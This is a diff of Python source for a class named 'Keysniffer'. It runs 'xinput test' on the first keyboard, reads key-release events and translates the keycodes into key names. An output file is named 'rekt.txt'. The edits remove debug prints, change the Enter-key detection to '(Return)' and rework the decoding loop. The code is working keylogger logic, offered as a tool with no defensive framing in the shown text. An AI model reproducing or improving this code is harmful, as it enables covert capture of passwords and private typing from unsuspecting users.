@@ -10,10 +10,7 @@ class Keysniffer():
 		self.keycodes = []
 		self.outfile = 'rekt.txt'
 		self.keyboards = self.getKeyboards()
-		print(self.keyboards)
-
 		self.getKeyCodes()
-		print(self.keycodes)
 	
 
 	def getKeyboards(self):
@@ -121,11 +118,10 @@ class Keysniffer():
 		in_buffer = list(codes)
 		out_buffer = []
 		for code in in_buffer:
-			while str(code).isnumeric():
+			if str(code).isnumeric():
 				out_buffer.append(self.findKey(code))
 
-		final_string = str().join(out_buffer)
-		return final_string
+		return out_buffer
 		
        
 	def keysToCodes(self, search):
@@ -159,19 +155,16 @@ class Keysniffer():
 		Execute xinput to begin sniffing keycodes. Fill a list buffer 
 		"""
 
-		outs = open(self.outfile, 'w')
-
-		# Get the code for the Enter key so we know when newlines happen.
+		# Get the code for the Return key so we know when newlines happen.
 		def get_enter():
 			for code in self.keycodes:
-				if code[1] == '(Enter)':
+				if code[1] == '(Return)' or code[2] == '(Return)':
 					enter = code[0]
 					return enter
 				else:
 					continue
 	
 		enter = get_enter()
-		print(enter)
 
 		# Call xinput to start sniffing keycodes and pipe its output 
 		keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
@@ -180,12 +173,13 @@ class Keysniffer():
 		
 		# stream_buffer = []
 		for line in keystream.stdout:
-			if "release" in line and str(enter) not in line:
-				stream_buffer = str(line).strip().split()[-1]
-				print(self.codesToKeys(stream_buffer))
-
+			kc = ['']
+			if "release" in line:
+				kc.append(str(line).strip().split()[-1])
+				print(self.codesToKeys(kc))
 			else:
-				pass
+				continue
+
 
 def main():
 	ks = Keysniffer()
